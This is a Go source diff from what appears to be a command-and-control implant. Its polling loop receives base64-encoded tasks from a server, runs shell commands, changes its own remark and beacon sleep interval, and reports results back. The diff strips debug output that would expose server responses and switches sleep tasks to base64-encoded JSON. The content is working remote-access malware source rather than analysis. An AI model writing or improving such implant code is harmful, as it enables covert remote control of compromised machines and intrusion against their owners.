@@ -7,11 +7,10 @@ import (
 	"bytes"
 	"encoding/base64"
 	"encoding/json"
-	"fmt"
+
 	"io/ioutil"
 	//"log"
 	"net/http"
-	"strconv"
 	"strings"
 	"time"
 )
@@ -71,10 +70,10 @@ func (c *Core) Pool() {
 
 
 		var action []Action
-		fmt.Println(string(body))
+
 		err = json.Unmarshal(body, &action)
 		if err != nil {
-			fmt.Println(string(err.Error()))
+
 			
 		}
 		for _, i := range action {
@@ -87,9 +86,9 @@ func (c *Core) Pool() {
 					c.event = append(c.event, Event{Action: "cmd", Data: err.Error()})
 					break
 				}
-				//fmt.Println("cmd", cmdData)
+
 				var cmd shell.Shell
-				err = json.Unmarshal([]byte(cmdData), &cmd)
+				err = json.Unmarshal(cmdData, &cmd)
 				if err != nil {
 
 					c.event = append(c.event, Event{Action: "cmd", Data: err.Error()})
@@ -126,13 +125,27 @@ func (c *Core) Pool() {
 					c.event = append(c.event, Event{Action: "remark", Data: err.Error()})
 				}
 				go func() {
+					c.info.Remarks = remark.Remark
 					c.event = append(c.event, Event{Action: "remark", Data: "Change Remark Successful."})
 				}()
 			case "sleep":
-				sleep, err := strconv.Atoi(i.Data)
-				if err == nil {
-					c.sleep = sleep
+				var sleep shell.Sleep
+				sleepData, err := base64.StdEncoding.DecodeString(i.Data)
+				if err != nil {
+					c.event = append(c.event, Event{Action: "sleep", Data: err.Error()})
+					break
 				}
+				err = json.Unmarshal([]byte(sleepData), &sleep)
+				if err != nil {
+					c.event = append(c.event, Event{Action: "sleep", Data: err.Error()})
+				}
+				go func() {
+					c.sleep = sleep.Sleep
+					c.event = append(c.event, Event{Action: "sleep", Data: "Change Sleep Successful."})
+				}()
+
+				
+				
 			}
 		}
 	}
